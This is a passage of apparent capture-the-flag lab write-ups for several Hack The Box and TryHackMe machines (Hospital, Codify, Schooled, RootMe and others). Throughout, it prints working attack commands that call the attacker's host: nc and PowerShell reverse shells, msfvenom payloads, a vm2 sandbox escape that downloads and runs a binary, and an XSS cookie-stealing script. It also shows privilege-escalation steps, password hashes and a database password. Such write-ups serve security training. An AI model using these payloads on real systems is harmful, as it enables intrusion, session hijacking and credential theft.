2028-09-06T10:49:031801/tcp open  msmq?2103/tcp open  msrpc             Microsoft Windows RPC2105/tcp open  msrpc             Microsoft Windows RPC2107/tcp open  msrpc             Microsoft Windows RPC2179/tcp open  vmrdp?3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb| Not valid before: 2023-09-06T10:49:03|_Not valid after:  2028-09-06T10:49:033269/tcp open  globalcatLDAPssl?| ssl-cert: Subject: commonName=DC| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb| Not valid before: 2023-09-06T10:49:03|_Not valid after:  2028-09-06T10:49:033389/tcp open  ms-wbt-server     Microsoft Terminal Services| ssl-cert: Subject: commonName=DC.hospital.htb| Not valid before: 2023-09-05T18:39:34|_Not valid after:  2024-03-06T18:39:34| rdp-ntlm-info: |   Target_Name: HOSPITAL|   NetBIOS_Domain_Name: HOSPITAL|   NetBIOS_Computer_Name: DC|   DNS_Domain_Name: hospital.htb|   DNS_Computer_Name: DC.hospital.htb|   DNS_Tree_Name: hospital.htb|   Product_Version: 10.0.17763|_  System_Time: 2023-11-21T06:29:12+00:008080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))|_http-server-header: Apache/2.4.55 (Ubuntu)| http-title: Login|_Requested resource was login.php|_http-open-proxy: Proxy might be redirecting requests| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not setService Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s| smb2-time: |   date: 2023-11-21T06:29:13|_  start_date: N/A| smb2-security-mode: |   311: |_    Message signing enabled and requiredService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 100.82 seconds\n\nGobuster$ gobuster dir --url http://hospital.htb:8080 --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://hospital.htb:8080[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Timeout:                 10s===============================================================2023/11/20 23:40:37 Starting gobuster in directory enumeration mode===============================================================/.htpasswd            (Status: 403) [Size: 279]/.hta                 (Status: 403) [Size: 279]/.htaccess            (Status: 403) [Size: 279]/css                  (Status: 301) [Size: 317] [--&gt; http://hospital.htb:8080/css/]/fonts                (Status: 301) [Size: 319] [--&gt; http://hospital.htb:8080/fonts/]/images               (Status: 301) [Size: 320] [--&gt; http://hospital.htb:8080/images/]/index.php            (Status: 302) [Size: 0] [--&gt; login.php]                         /js                   (Status: 301) [Size: 316] [--&gt; http://hospital.htb:8080/js/]    /server-status        (Status: 403) [Size: 279]                                       /uploads              (Status: 301) [Size: 321] [--&gt; http://hospital.htb:8080/uploads/]/vendor               (Status: 301) [Size: 320] [--&gt; http://hospital.htb:8080/vendor/]                                                                                        ===============================================================2023/11/20 23:41:06 Finished===============================================================\nWe can see there is direcory called uploads, we will use this later\nHTTPS Page (port 443)&#x2F;etc&#x2F;hosts\nIt appears to be a mail login page\nHTTP Page (port 8080)Another login page, however in this one we can create an account\nCreate an account and login\nFootholdReverse ShellWhen we login, we have the option to upload a fileHowever, when I tried uploading a .php file, it did not work\nChanging the extension from .php to .phar, allowed me to upload the file\nWhen I tried to use the revshell, the connection closes instantly and I get an error in the webpage\nUsing p0wny@shell:~# allows us to get a shell on the machine\nJust download the shell change the extension from .php to .phar and upload it.Then we if we open the file through the browser, we get a shell\nThen we can rebound the shell to our terminal\n$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.25 1337 &gt;/tmp/f\n\nmeterpreterI then changed to a meterpreter shell\n$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.25 LPORT=1337 -f elf -o reverse.elf\n\nLinux Subsystem PrivEscWe know that this machine is a Windows machine, but we are on a Linux subsystem at the momentWe can use this exploit to elevate our privileges on the linux subsystem\nWe can download it and use meterpreter to upload itThen we compile it and run it\n$ gcc exploit.c -o exploit$ Chmod +x exploit$ ./exploit\n\n\nMail CredentialsWe now have access to the &#x2F;etc&#x2F;shadow file, where we can get drwilliams hashed password\ndrwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::\n\nWe can use john to decrypt the hash, just put it in a .txt file and run john\n$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\nGhostScript ExploitWe can now login to the Hospital Webmail\nIf we read the email, there is a mention of GhostScript and the .eps extension.\nAfter searching for ghostscript exploit, I found CVE-2023-36664\nFirst we generate the .eps revshell file\n$ python3 CVE_2023_36664_exploit.py --generate --revshell -ip 10.10.14.25 -port 4242 --filename trigger_revshell --extension eps\nThen we inject the payload (PowerShell Base64)\n$ python3 CVE_2023_36664_exploit.py --inject --payload &quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA1ACIALAA0ADIANAAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot; --filename trigger_revshell.eps\n\nNow we just setup a netcat listener and send an email to drbrown with the generated .eps file\nWe can now get the user flag\nPrivEscMeterpreterI upgraded to a meterpreter session\nRoot FlagIf we run icacls in the htdocs folder, we can see that it is owned by NT AUTHORITY\\SYSTEM\nI used p0wny@shell:~# againJust upload it using meterpreter to the htdocs directory\nWe can now get a shell as NT AUTHORITY\\SYSTEM and get the root flag\n","categories":["HTB"],"tags":["machine","medium"]},{"title":"[HTB] Codify","url":"/HTB/Codify/","content":"\n\n  \n  \n  \n\n  \n  \n    \n      OS:\n      Linux\n    \n    \n      Difficulty:\n      Easy\n    \n    \n      Author:\n      kavigihan\n    \n    \n      Release Date:\n      November 4, 2023\n    \n  \n\n\n\n\n  @media (max-width: 600px) {\n    div[style*=\"display: flex; flex-wrap: wrap;\"] {\n      flex-direction: column;\n      align-items: center;\n    }\n\n    div[style*=\"flex: 1 1 auto;\"] {\n      max-width: 100%;\n      text-align: center;\n    }\n\n    div[style*=\"flex: 1 1 300px;\"] {\n      flex: 1 1 auto;\n      max-width: 100%;\n    }\n  }\n\n\n\nReconnmap$ nmap -sC -sV 10.10.11.239Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-04 19:46 WETNmap scan report for 10.10.11.239Host is up (0.060s latency).Not shown: 997 closed tcp ports (reset)PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)|_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)80/tcp   open  http    Apache httpd 2.4.52|_http-title: Did not follow redirect to http://codify.htb/|_http-server-header: Apache/2.4.52 (Ubuntu)3000/tcp open  http    Node.js Express framework|_http-title: CodifyService Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 15.13 seconds\n\n\n\n\nPort\nService\n\n\n\n22\nSSH\n\n\n80\nHTTP\n\n\n3000\nNode.js\n\n\nHTTP&#x2F;etc&#x2F;hosts\nWeb Page\nIn the about page, we can see that the code editor we can use on the page, uses the vm2 library\nFootholdExploitSearching for vm2 exploit I came across CVE-2023-29017\nIt’s a RCE vulnerability, so I tried uploading a file from my machineCreated a test file and started a python http server\nThen I ran this code on the code editor\nconst &#123;VM&#125; = require(&quot;vm2&quot;);const vm = new VM();const code = `async function fn() &#123;    (function stack() &#123;        new Error().stack;        stack();    &#125;)();&#125;p = fn();p.constructor = &#123;    [Symbol.species]: class FakePromise &#123;        constructor(executor) &#123;            executor(                (x) =&gt; x,                (err) =&gt; &#123; return err.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;wget http://10.10.14.2:1234/test&#x27;); &#125;            )        &#125;    &#125;&#125;;p.then();`;console.log(vm.run(code));\n\nAnd I confirmed that it downloaded the file from my machine\nSo now all I have to do is create a reverse shell file, upload it, and then run it from the code editor\nCreate the Reverse Shell\n$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=1337 -f elf &gt;reverse.elf\n\nStart a python http server again\n$ python3 -m http.server 1234\n\nAnd now download the reverse shell to the target machine with this code\nconst &#123;VM&#125; = require(&quot;vm2&quot;);const vm = new VM();const code = `async function fn() &#123;    (function stack() &#123;        new Error().stack;        stack();    &#125;)();&#125;p = fn();p.constructor = &#123;    [Symbol.species]: class FakePromise &#123;        constructor(executor) &#123;            executor(                (x) =&gt; x,                (err) =&gt; &#123; return err.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;wget http://10.10.14.2:1234/reverse.elf&#x27;); &#125;            )        &#125;    &#125;&#125;;p.then();`;console.log(vm.run(code));\n\nWe can confirm that the file was downloaded\nFirst ShellNow to get our first shell, first setup a listener\n$ msfconsoleuse exploit/multi/handlerset PAYLOAD linux/x86/meterpreter/reverse_tcpset LHOST 10.10.14.2set LPORT 1337set ExitOnSession falserun\n\nRun the reverse shell file through the code editor\nconst &#123;VM&#125; = require(&quot;vm2&quot;);const vm = new VM();const code = `async function fn() &#123;    (function stack() &#123;        new Error().stack;        stack();    &#125;)();&#125;p = fn();p.constructor = &#123;    [Symbol.species]: class FakePromise &#123;        constructor(executor) &#123;            executor(                (x) =&gt; x,                (err) =&gt; &#123; return err.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;./reverse.elf&#x27;); &#125;            )        &#125;    &#125;&#125;;p.then();`;console.log(vm.run(code));\n\nAnd we get our first shell on the machine, as the user svc\nLateral Movementtickets.dbLooking into &#x2F;var&#x2F;www&#x2F;contact, we can find a tickets.db file.\nDownload the file.\nGet Joshua’s hashed password from the users table\n\n$2a$12$SOn8Pf6z8fO&#x2F;nVsNbAAequ&#x2F;P6vLRJJl7gCUEiYBU2iLHn4G&#x2F;p&#x2F;Zw2\n\nDecrypting the hashLooking at the hash, and after a quick search, we know that this is a bcrypt hashWe can just use john to decrypt it\n$ john --format=bcrypt hash.txt \n\nuser.txt flagNow we can just login as Joshua through ssh\n$ ssh joshua@10.10.11.239\n\nAnd we get the user flag\nPrivEscmysql-backup.shBy running sudo -l, we can see that Joshua can run mysql-backup.sh as root\nBy looking at the mysql-backup.sh code, we see that it checks for the root password on &#x2F;root&#x2F;.creds and checks it against our input, if we input the correct root password, it runs the rest of the code, which creates a backup of the database.\nIf we insert an asterisk (*) when asked for the root password, it bypasses the password check and runs the entire code.\npspyWe know, that by looking at the script code, it runs some code using the $DB_PASS variable, which is the root password, but when we run the script, it does not show in the terminal.\nFor this reason, we can use pspy to snoop in the process and see the command in plaintext.\nTransfer the pspy script to the target machine, split the terminal and run pspy in one of them.Then run the mysql-backup.sh script on the other terminal.Now we can see the command that was ran using the root password.\nNow just get the root flag\n","categories":["HTB"],"tags":["machine","easy"]},{"title":"[HTB] Mirai","url":"/HTB/Mirai/","content":"\n\n  \n  \n  \n\n  \n  \n    \n      OS:\n      Linux\n    \n    \n      Difficulty:\n      Easy\n    \n    \n      Author:\n      Arrexel\n    \n    \n      Release Date:\n      September 1, 2017\n    \n  \n\n\n\n\n  @media (max-width: 600px) {\n    div[style*=\"display: flex; flex-wrap: wrap;\"] {\n      flex-direction: column;\n      align-items: center;\n    }\n\n    div[style*=\"flex: 1 1 auto;\"] {\n      max-width: 100%;\n      text-align: center;\n    }\n\n    div[style*=\"flex: 1 1 300px;\"] {\n      flex: 1 1 auto;\n      max-width: 100%;\n    }\n  }\n\n\n\n\nReconNmap$ nmap -sC -sV 10.10.10.48 -o nmap_scan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-14 18:54 WETNmap scan report for 10.10.10.48Host is up (0.060s latency).Not shown: 996 closed tcp ports (reset)PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)| ssh-hostkey: |   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)53/tcp   open  domain  dnsmasq 2.76| dns-nsid: |_  bind.version: dnsmasq-2.7680/tcp   open  http    lighttpd 1.4.35|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).|_http-server-header: lighttpd/1.4.351033/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 22.26 seconds\n\n\n\nPort\nService\n\n\n\n22\nSSH\n\n\n53\nDNS\n\n\n80\nHTTP\n\n\nGobuster$ gobuster dir --url http://10.10.10.48/ --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt           ===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.10.48/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/admin                (Status: 301) [Size: 0] [--&gt; http://10.10.10.48/admin/]\n\nFound &#x2F;admin directory\n\nPi-HoleDefault LoginBy googling for Pi-hole default login, we can find a username and password\n\nWe can use this to ssh into the machine\n$ ssh pi@10.10.10.48\n\nWith this we can just get the user flag from the user pi desktop\nPrivEscUSB StickBy running the mount command, we can see that there is a usb device plugged in\n\nIf we check it’s contents, we get a hint that the files were deleted, but that might be a way to get them back\n\nWe can create create an image of the usb stick, and then run strings on it, since the contents were removed but not overwritten.\n1 - Create the image\n\n2 - Run strings on the image\n\nDone\n","categories":["HTB"],"tags":["machine","easy"]},{"title":"[THM] RootMe","url":"/THM/RootMe/","content":"Reconnmap$ nmap -sC -sV 10.10.238.95Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-28 00:14 WESTNmap scan report for 10.10.238.95Host is up (0.079s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)|   256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)|_  256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set|_http-title: HackIT - HomeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nPorts Open:\n\n22: SSH\n80: HTTP\n\nApache version is 2.4.29\nGobuster$ gobuster dir --url 10.10.238.95 --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.238.95[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Timeout:                 10s===============================================================2023/10/28 00:17:11 Starting gobuster in directory enumeration mode===============================================================/.hta                 (Status: 403) [Size: 277]/.htaccess            (Status: 403) [Size: 277]/.htpasswd            (Status: 403) [Size: 277]/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.238.95/css/]/index.php            (Status: 200) [Size: 616]                               /js                   (Status: 301) [Size: 309] [--&gt; http://10.10.238.95/js/] /panel                (Status: 301) [Size: 312] [--&gt; http://10.10.238.95/panel/]/server-status        (Status: 403) [Size: 277]                                 /uploads              (Status: 301) [Size: 314] [--&gt; http://10.10.238.95/uploads/]                                                                                  ===============================================================2023/10/28 00:17:50 Finished===============================================================\n\nImportant directories:&#x2F;uploads and &#x2F;panel\nHTTP PagePage running on port 80:\nThe &#x2F;panel directory allows us to upload files\nFootholdUpload RevShellI tried uploading a php reverse shell, but it does not allow php\nI changed the extension from .php to .php5 and it worked\n$ mv php-reverse-shell.php php-reverse-shell.php5\n\nThe file is now in the uploads directory\nGetting a shellNow we just have to setup a netcat listener and open the file to get a shell\n$ nc -lvnp 1234listening on [any] 1234 ...connect to [10.9.132.243] from (UNKNOWN) [10.10.238.95] 60070Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 23:28:36 up 17 min,  0 users,  load average: 0.00, 0.23, 0.55USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#x27;t access tty; job control turned off$ whoamiwww-data\n\nuser.txt flagWe now have a shellNext we search for the user flag\n$ find / -name user.txt 2&gt; /dev/null/var/www/user.txt\nWe can now get the user flag\nPrivEscSUIDTo escalate our privileges, we can search for files that have root SUID permissions\n$ find / -user root -perm /4000\nWe can run python as root\nWe can find what code to run to escalate our privileges in GTFOBins\n$ python -c &#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;whoamiroot\n\nroot.txt flagNow we just grab the root.txt flag\n$ cat /root/root.txtTHM&#123;pr1v1l3g3_3sc4l4t10n&#125;\n\n","categories":["THM"],"tags":["machine"]},{"title":"[HTB] Schooled","url":"/HTB/Schooled/","content":"\n\n  \n  \n  \n\n  \n  \n    \n      OS:\n      FreeBSD\n    \n    \n      Difficulty:\n      Medium\n    \n    \n      Author:\n      TheCyberGeek\n    \n    \n      Release Date:\n      April 3, 2021\n    \n  \n\n\n\n\n  @media (max-width: 600px) {\n    div[style*=\"display: flex; flex-wrap: wrap;\"] {\n      flex-direction: column;\n      align-items: center;\n    }\n\n    div[style*=\"flex: 1 1 auto;\"] {\n      max-width: 100%;\n      text-align: center;\n    }\n\n    div[style*=\"flex: 1 1 300px;\"] {\n      flex: 1 1 auto;\n      max-width: 100%;\n    }\n  }\n\n\n\nReconNmap$ nmap -sC -sV 10.10.10.234 -o nmap_scanStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-07 14:13 WETNmap scan report for 10.10.10.234Host is up (0.058s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)| ssh-hostkey: |   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)80/tcp open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)|_http-title: Schooled - A new kind of educational institute|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15| http-methods: |_  Potentially risky methods: TRACEService Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsdService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 15.90 seconds\n\n\n\n\nPort\nService\n\n\n\n22\nSSH\n\n\n80\nApache\n\n\nhttp page\nsubdomains$ ffuf -u http://10.10.10.234 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &quot;HOST: FUZZ.schooled.htb&quot; -fs 20750        /&#x27;___\\  /&#x27;___\\           /&#x27;___\\              /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/              \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\              \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/               \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                 \\/_/    \\/_/   \\/___/    \\/_/              v2.1.0-dev________________________________________________ :: Method           : GET :: URL              : http://10.10.10.234 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header           : Host: FUZZ.schooled.htb :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500 :: Filter           : Response size: 20750________________________________________________moodle                  [Status: 200, Size: 84, Words: 5, Lines: 2, Duration: 58ms]\n\nWe can see that there is a moodle subdomain.After adding it to our hosts file, we can access it.\n\nFootholdStudent AccountWe can start by creating a student account on the platform.The email needs to end with @student.schooled.htb\nAfter creating the account, we can enroll in the Mathematics course.\nIf we look at the announcements, we get a hint regarding the MoodleNet profile\nCVE-2020-25627We can head to &#x2F;moodle&#x2F;lib&#x2F;upgrade.txt to see the moodle version being used.\nAfter searching for vulnerabilities in version 3.9, we can find CVE-2020-25627, which indicates that there is a stored xss vulnerability in the moodlenetprofile field in the user’s profile page.\nWe can test this by editing our profile and trying for an alert.\nNow if we save the profile, go to our profile page, we will get an alert, meaning the stored xss worked.\nTeacher AccountWe can use this xss vulnerability to send session cookies to our machine.\nInsert the following code in the vulnerable field.\n&lt;script&gt;document.location=&quot;http://10.10.14.20:8000/?&quot;+document.cookie&lt;/script&gt;\n\nNow setup a way to listen to the requests on our machine, I used a python http server in this case.And if you visit your own profile with the listener running, you will receive a request with your session cookie.But if you wait a few minutes, you will get a session cookie from another user.\nNow just change your session cookie in your browser\nFinally, if you refresh your page, you will now be logged in as another user\nThis user is a teacher for the Mathematics course\nCVE-2020-14321Now since we have a teacher account, this moodle version (3.9), is vulnerable to another exploit (CVE-2020-14321), which allows us to assign the manager role to teachers.\nUsing this exploit we can easily assign the manager role to a teacher using a session cookie\n$ python3 CVE-2020-14321 http://moodle.schooled.htb/moodle --cookie &lt;session cookie&gt;\n\nIf we now refresh our page, we will have access to the site administration page\nWe will now install this malicious plugin which will allow us to execute code.\nAfter installing, we can test rce by running this command\n$ curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id\n\nTo get our first shell, we just change the cmd to a revshell (url encoded)\nStart a listener and run curl again\nLateral Movement&#x2F;etc&#x2F;passwd\nmysqlWe can find credentials for a database in the file &#x2F;usr&#x2F;local&#x2F;www&#x2F;apache24&#x2F;data&#x2F;moodle&#x2F;config.php\nWe can use this user and password to access the database\n$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020use moodle;show tables;\n\nIn the table mdl_user, we have username and password columns\nThe passwords are encrypted\nIf we see all details for the user admin, we also see that his name is Jamie, which we know is a user in the machine (from the passwd file)\nJohnWe can use john to decrypt the admin password\n$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW\n\nNow just ssh as Jamie using this password and get the user flag\nPrivEscfpmBy running sudo -l, we se that we can install and update packages using pkg as root\nIf we search gtfobins for pkg, we can use it to escalate our privileges, but we need fpm, which the target machine does not have.We will install fpm on our machine and create the malicious package.Then we transfer the package to the target machine and use pkg as root to install it, running the malicious code and getting a root shell.\nOn local machine\n$ gem install fpm$ TF=$(mktemp -d)$ echo &#x27;/tmp/root.sh&#x27; &gt; $TF/x.sh$ fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF\n\nIf all is done right, we should now have a package called x-1.0.txz\npkgNow we need to transfer this file to the target machine\nThis package when installed will run the file &#x2F;tmp&#x2F;root.shWe still have not created this file, so this is what we need to do next.\nDon’t forget to make it executable \n$ chmod +x /tmp/root.sh\n\nFinally, to get root, start a new listener on the port that you inserted into root.sh and run pkg with sudo\n$ sudo pkg install -y --no-repo-update ./x-1.0.txz\n\nAnd we have root\n","categories":["HTB"],"tags":["machine","medium"]},{"title":"[HTB] Sightless","url":"/HTB/Sightless/","content":"\n\n  \n  \n  \n\n  \n  \n    \n      OS:\n      Linux\n    \n    \n      Difficulty:\n      Easy\n    \n    \n      Author:\n      EmSec\n    \n    \n      Release Date:\n      September 7, 2024\n    \n  \n\n\n\n\n  @media (max-width: 600px) {\n    div[style*=\"display: flex; flex-wrap: wrap;\"] {\n      flex-direction: column;\n      align-items: center;\n    }\n\n    div[style*=\"flex: 1 1 auto;\"] {\n      max-width: 100%;\n      text-align: center;\n    }\n\n    div[style*=\"flex: 1 1 300px;\"] {\n      flex: 1 1 auto;\n      max-width: 100%;\n    }\n  }\n\n\nVideo Walkthrough\n\n\nReconNmapnmap -T4 -A -p- 10.10.11.32 -o initial_scanStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 13:38 WESTNmap scan report for 10.10.11.32Host is up (0.041s latency).Not shown: 65532 closed tcp ports (reset)PORT   STATE SERVICE VERSION21/tcp open  ftp| fingerprint-strings: |   GenericLines: |     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]|     Invalid command: try being more creative|_    Invalid command: try being more creative22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://sightless.htb/1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port21-TCP:V=7.94SVN%I=7%D=9/13%Time=66E43281%P=x86_64-pc-linux-gnu%r(GSF:enericLines,A0,&quot;220\\x20ProFTPD\\x20Server\\x20\\(sightless\\.htb\\x20FTP\\x20SF:Server\\)\\x20\\[::ffff:10\\.10\\.11\\.32\\]\\r\\n500\\x20Invalid\\x20command:\\x20SF:try\\x20being\\x20more\\x20creative\\r\\n500\\x20Invalid\\x20command:\\x20try\\xSF:20being\\x20more\\x20creative\\r\\n&quot;);No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP 